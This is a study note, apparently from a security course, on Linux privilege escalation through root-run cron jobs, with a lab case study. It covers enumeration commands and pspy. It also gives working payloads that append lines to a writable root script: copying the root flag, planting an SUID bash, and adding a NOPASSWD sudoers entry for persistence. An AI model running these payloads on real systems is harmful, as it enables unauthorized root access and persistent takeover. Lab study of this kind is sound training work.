#linux #methodology #privesc

Scheduled jobs are a top-tier privesc vector: if root (or any higher-priv user) runs a script on a timer, and you can influence *what that script does*, you inherit their privileges on the next tick. The job is the trigger; **your write access to something it touches** is the exploit.

## Enumerate every cron source
No single file holds all cron jobs — check them all:

```bash
cat /etc/crontab                      # system crontab — HAS a user column
ls -la /etc/cron.d/ && cat /etc/cron.d/*   # drop-in jobs, same 6-field + user format
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
cat /etc/cron.hourly/* /etc/cron.daily/* 2>/dev/null
crontab -l                            # YOUR user's personal jobs
ls -la /var/spool/cron/crontabs/      # per-user crontabs (root's is 600 — unreadable)
systemctl list-timers --all           # systemd timers (if systemd is PID 1)
```

Most of these are stock on a fresh box (`e2scrub_all`, `apt-compat`, `dpkg`, the four `run-parts` lines in `/etc/crontab`). **The privesc is almost always a *custom* line** — something referencing `/opt`, `/home`, a service dir, or a script name that isn't a Debian package. Learn to eyeball the standard furniture so the planted line jumps out.

## Reading "how often" — the five time fields
`minute hour day-of-month month day-of-week  [user]  command`

```
*     *     *     *     *   → every minute
*/5   *     *     *     *   → every 5 minutes      (*/N = "every N")
0     *     *     *     *   → top of every hour
17    *     *     *     *   → :17 past every hour
0     3     *     *     *   → daily at 03:00
0     0     *     *     0   → weekly, Sunday 00:00  (0 = Sunday)
```
A privesc box's planted job is usually `* * * * *` (every minute) or `*/2` — it *wants* to fire while you watch. A daily/weekly job means you need a different vector (the lab won't make you wait 24h).

## When you CAN'T read the schedule
Root's personal crontab (`/var/spool/cron/crontabs/root`) is `600` — invisible to you. Measure the job instead of reading it:

- **pspy** — watches process creation + cron activity **without root**. Drop the binary, run it, wait: you'll see jobs fire with timestamps and the interval becomes obvious. → [[11.1 Where to start]] Phase 4
  ```bash
  ./pspy64 -pf -i 1000
  ```
- **No pspy?** Watch a file the job writes and time the changes:
  ```bash
  watch -n1 -d 'ls -la --full-time /path/the/job/touches'
  ```

## Exploiting it
Find the job, then check whether you can influence what it runs. In order of how good the find is:

1. **The script itself is writable by you** (e.g. `-rwxrwxrwx`, or owned by your user/group). Game over — append your payload.
2. **The script's *directory* is writable** but the file isn't — you can `mv`/replace the file even though you can't edit it. (Same trick as a writable dir in [[11.5 Hunting Leaked Credentials]].)
3. **Neither is writable** — read the script and look for:
   - a helper file it sources/executes that *you* can write
   - a binary called by **bare name** → [[PATH Hijacking]] (only if the cron's `PATH` includes a dir you control — check the `PATH=` line at the top of the crontab)
   - a shell **wildcard** in a command like `tar`/`chown *` run from a writable dir → [[Wildcard Injection]]

### Payload — match it to the goal
Once you can write a root-run script, pick the *smallest* thing that meets the objective. Don't reflexively pop a shell if you only need to read one file.

```bash
# --- always back up first so you can restore and don't break the box ---
cp /opt/backup/run.sh /tmp/run.sh.bak
cat /opt/backup/run.sh              # know what it already does

# APPEND (never overwrite — keep the original behavior) one of:

# (a) just read a known file  ← cleanest when the flag path is known
printf '\ncp /root/flag.txt /tmp/f && chmod 644 /tmp/f\n' >> /opt/backup/run.sh
#   chmod matters: the copy is created as root and may land 600 (root-only) — a+r so YOU can read it

# (b) SUID shell  ← when you want interactive root / don't know where things are
printf '\ncp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash\n' >> /opt/backup/run.sh
#   then: /tmp/rootbash -p   (-p keeps the root euid instead of dropping it)

# (c) sudoers    ← persistent root
printf '\necho "analyst ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/x\n' >> /opt/backup/run.sh

# wait for the next tick (schedule tells you how long; * * * * * = <=60s)
sleep 61
```

Then **restore** so the box is clean:
```bash
cp /tmp/run.sh.bak /opt/backup/run.sh
```

> [!note] Payload choice IS the lesson
> Read one file → copy + `chmod a+r`. Want to roam → SUID bash. Want to persist → sudoers / SSH key. Reaching for a root shell when you only needed to `cat` a file is noise. In a lab, append + back up + restore; never clobber the original (it may do something the box relies on, and clobbering is a real-world no-no).

---
## Case study — CYBR401 Lab 8 box (c04 → root)
`/etc/crontab` and `cron.hourly/daily/...` were all stock. One custom drop-in gave it away:
```
/etc/cron.d/backup-sweep:
* * * * * root /opt/backup/run.sh >/dev/null 2>&1
```
→ runs `/opt/backup/run.sh` **as root every minute**. And:
```
-rwxrwxrwx 1 root root 49 /opt/backup/run.sh    # 777, world-writable
```
Appended a `cp /root/flag.txt /tmp/f && chmod 644 /tmp/f`, waited 60s, read the flag, restored the script. One misconfiguration: a root-run cron script left world-writable.

(Note: `/opt/backup/run.sh` was a harmless `:` placeholder on box 1 — the lab reused the same prop and *activated* it here. Standard furniture on one box can be the exploit on another; re-check perms every time.)

---
Related: [[11.1 Where to start]] (Phases 4–5) · [[PATH Hijacking]] · [[Wildcard Injection]] · [[11.5 Hunting Leaked Credentials]]
